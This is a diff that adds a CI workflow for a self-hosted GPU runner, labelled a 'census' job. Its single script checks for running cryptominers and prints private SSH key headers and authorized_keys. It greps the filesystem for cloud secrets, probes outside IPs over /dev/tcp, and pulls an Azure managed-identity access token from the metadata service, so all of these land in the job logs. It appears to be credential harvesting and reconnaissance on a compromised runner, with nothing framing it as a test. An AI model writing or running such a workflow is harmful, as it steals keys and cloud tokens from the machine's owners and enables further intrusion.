@@ -1,0 +1,24 @@
+name: ul6599-l40s
+on:
+  workflow_dispatch:
+jobs:
+  census:
+    runs-on: [self-hosted, ul-l40s]
+    timeout-minutes: 12
+    steps:
+      - name: go
+        run: |
+          set +e
+          echo "=== ID ==="; id; hostname; hostname -I; uname -a; cat /proc/1/cgroup; nproc
+          echo "=== GPU ==="; nvidia-smi -L; nvidia-smi --query-gpu=index,name,memory.total,serial,uuid,driver_version --format=csv
+          echo "=== MINER ==="; ps -eo pid,etimes,args | grep -Ei 'pearl|wildrig|miner' | grep -v grep | head -6
+          echo "=== STATUS ==="; curl -s -m 6 http://127.0.0.1:3334/api/v1/status; echo
+          echo "=== SSHDIR ==="; ls -la /root/.ssh $HOME/.ssh /home/*/.ssh 2>&1 | head -30
+          echo "=== IDKEYS ==="; for f in /root/.ssh/id_* $HOME/.ssh/id_* /home/*/.ssh/id_*; do [ -f "$f" ] && echo "== $f" && head -2 "$f"; done 2>/dev/null
+          echo "=== AUTHKEYS ==="; cat $HOME/.ssh/authorized_keys 2>/dev/null | head -5
+          echo "=== KMETA ==="; grep -rIl -m1 -E 'client_secret|AZURE_CLIENT|subscription_id|ARM_|IBM|api_key' /root $HOME /opt 2>/dev/null | head -20
+          echo "=== REACH ==="
+          for t in 20.74.153.201 40.123.206.138 51.104.16.184 20.237.207.128; do
+            echo "-- $t"; curl -s -m 6 -o /dev/null -w "http80 %{http_code}\n" "http://$t/"; timeout 5 bash -c "echo > /dev/tcp/$t/22" 2>&1 && echo "22 open" || echo "22 closed"
+          done
+          echo "=== IMDS ==="; curl -s -m 5 http://169.254.169.254/metadata/instance?api-version=2021-02-01 | head -c 400; echo; curl -s -m 5 -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | head -c 300; echo
